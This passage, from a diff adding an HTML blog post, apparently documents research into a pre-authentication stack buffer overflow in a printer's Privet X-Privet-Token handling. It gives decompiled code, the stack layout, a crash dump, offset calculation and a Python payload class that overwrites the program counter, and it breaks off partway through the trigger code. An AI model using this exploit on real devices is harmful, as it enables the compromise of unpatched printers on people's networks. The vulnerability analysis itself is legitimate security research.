+    &lt;span class="n"&gt;base64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tklen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;colon&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strtok&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;colon&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha1_from_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;colon&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="n"&gt;v4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strtok&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;v4&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="n"&gt;sprintf_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str_to_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;%s%s%s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x_privet_secret&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str_to_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha1_res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sha1len&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;sha1_res&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;strcmp_0&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;sha1_from_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha1_res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x14u&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;timestamp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strtol2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="n"&gt;lvl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;86400&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="n"&gt;time_delta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;LODWORD&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;qword_470B80E0&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;time_delta&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;86400&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[NTPV] %s: x-privet-token is valid.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+          &lt;span class="n"&gt;lvl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt;
+        &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[NTPV] %s: issue_timecounter is expired!!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;time_delta&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;86400&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3661&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lvl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ntpv_isXPrivetTokenValid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3661&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ntpv_isXPrivetTokenValid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;
+      &lt;span class="k"&gt;else&lt;/span&gt;
+      &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3661&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[NTPV] %s: SHA1 hash value is invalid!!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ntpv_isXPrivetTokenValid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+      &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3661&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[NTPV] ERROR %s fail to generate hash string.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ntpv_isXPrivetTokenValid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3661&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[NTPV] %s() DEBUG MODE: Don&amp;#39;t check X-Privet-Token.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ntpv_isXPrivetTokenValid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The vulnerable code is the following line:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;base64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tklen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With some thought, one can recognize the bug from the function signature itself -- there is no buffer length parameter passed in, meaning &lt;code&gt;base64decode&lt;/code&gt; has no knowledge of buffer bounds.
+In this case, it decodes the base64-encoded value of the &lt;code&gt;X-Privet-Token&lt;/code&gt; header into the local, stack based &lt;code&gt;buffer&lt;/code&gt; which is 256 bytes long. The header is attacker-controlled is limited only by HTTP constraints, and as a result can be much larger. This leads to a textbook stack-based buffer overflow. The stack frame is relatively simple:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-00000178 var_178         DCD ?
+-00000174 buffer          DCB 256 dup(?)
+-00000074 str_to_hash     DCB 28 dup(?)
+-00000058 sha1_res        DCB 20 dup(?)
+-00000044 var_44          DCD ?
+-00000040 sha1_from_token DCB 24 dup(?)
+-00000028 last_part       DCB 12 dup(?)
+-0000001C now             DCD ?
+-00000018                 DCB ? ; undefined
+-00000017                 DCB ? ; undefined
+-00000016                 DCB ? ; undefined
+-00000015                 DCB ? ; undefined
+-00000014 sha1len         DCD ?
+-00000010
+-00000010 ; end of stack variables
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;buffer&lt;/code&gt; array is not really far from the stored return address, so exploitation should be relatively easy. Initially, we found the call to the vulnerable function in the &lt;code&gt;/privet/printer/createjob&lt;/code&gt; URL handler, which is &lt;em&gt;not&lt;/em&gt; accessible before authenticating, so we had to dig a bit more.&lt;/p&gt;
+&lt;h2 id="ntpv-functions"&gt;ntpv functions&lt;/h2&gt;
+&lt;p&gt;The various ntpv URLs and handlers are nicely defined in two different arrays of structures as you can see below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privet_url&lt;/span&gt; &lt;span class="n"&gt;nptv_urls&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/register&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/accesstoken&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/capabilities&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/printer/createjob&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/printer/submitdoc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/privet/printer/jobstate&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;DATA:45C91C0C nptv_cmds       id_cmd &amp;lt;0, ntpv_procInfo&amp;gt;
+DATA:45C91C0C                                         ; DATA XREF: ntpv_cgiMain+338↑o
+DATA:45C91C0C                                         ; ntpv_cgiMain:ntpv_cmds↑o
+DATA:45C91C0C                 id_cmd &amp;lt;1, ntpv_procRegister&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;2, ntpv_procAccesstoken&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;3, ntpv_procCapabilities&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;4, ntpv_procCreatejob&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;5, ntpv_procSubmitdoc&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;6, ntpv_procJobstate&amp;gt;
+DATA:45C91C0C                 id_cmd &amp;lt;7, 0&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After reading the &lt;a href="https://developers.google.com/cloud-print/docs/privet"&gt;documentation&lt;/a&gt; and reversing the code, it appeared that the &lt;code&gt;register&lt;/code&gt; URL was accessible without authentication and called the vulnerable
+code.&lt;/p&gt;
+&lt;h1 id="exploitation"&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id="triggering-the-bug"&gt;Triggering the bug&lt;/h2&gt;
+&lt;p&gt;Using a pattern generated with &lt;a href="https://github.com/trou/rsbkb"&gt;rsbkb&lt;/a&gt;, we were able to get the following crash on the serial port:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Dry&amp;gt; &amp;lt; Error Exception &amp;gt;
+ CORE : 0
+ TYPE : prefetch
+ ISR  : FALSE
+ TASK ID   : 269
+ TASK Name : AsC2
+ R 0  : 00000000
+ R 1  : 00000000
+ R 2  : 40ec49fc
+ R 3  : 49789eb4
+ R 4  : 316f4130
+ R 5  : 41326f41
+ R 6  : 6f41336f
+ R 7  : 49c1b38c
+ R 8  : 49d0c958
+ R 9  : 00000000
+ R10  : 00000194
+ R11  : 45c91bc8
+ R12  : 00000000
+ R13  : 4978a030
+ R14  : 4167a1f4
+ PC   : 356f4134
+ PSR  : 60000013
+ CTRL : 00c5187d
+        IE(31)=0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Which gives:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ rsbkb bofpattoff 4Ao5
+Offset: 434 (mod 20280) / 0x1b2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Astute readers will note that the offset is too big compared to the local stack frame size, which is only 0x178 bytes. Indeed, the correct offset for &lt;code&gt;PC&lt;/code&gt;, from the start of the local buffer is 0x174. The 0x1B2 which we found using the buffer overflow pattern actually triggers a crash elsewhere and makes exploitation way harder. So remember to always check if your offsets make sense.&lt;/p&gt;
+&lt;h2 id="buffer-overflow"&gt;Buffer overflow&lt;/h2&gt;
+&lt;p&gt;As the firmware is lacking protections such as stack cookies, NX, and ASLR, exploiting the buffer overflow should be rather straightforward, despite the printer running &lt;a href="https://en.wikipedia.org/wiki/DRYOS"&gt;DRYOS&lt;/a&gt; which differs from usual operating systems. Using the information gathered while researching the vulnerability, we built the following class to exploit the vulnerability and overwrite the &lt;code&gt;PC&lt;/code&gt; register with an arbitrary address:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;PrivetPayload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ret_addr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1337&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ret_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ret_addr&lt;/span&gt;
+
+    &lt;span class="nd"&gt;@property&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x44\x44\x44\x44&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="nd"&gt;@property&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x55\x55\x55\x55&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="nd"&gt;@property&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x66\x66\x66\x66&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="nd"&gt;@property&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ret_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__bytes__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+            &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mh"&gt;0x160&lt;/span&gt;
+            &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# pHashStrBufLen&lt;/span&gt;
+            &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;r4&lt;/span&gt;
+            &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;r5&lt;/span&gt;
+            &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;r6&lt;/span&gt;
+            &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pc&lt;/span&gt;
+        &lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The vulnerability can then be triggered with the following code, assuming the printer's IP address is &lt;code&gt;192.168.1.100&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;http.client&lt;/span&gt;
+
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;privet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PrivetPayload&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
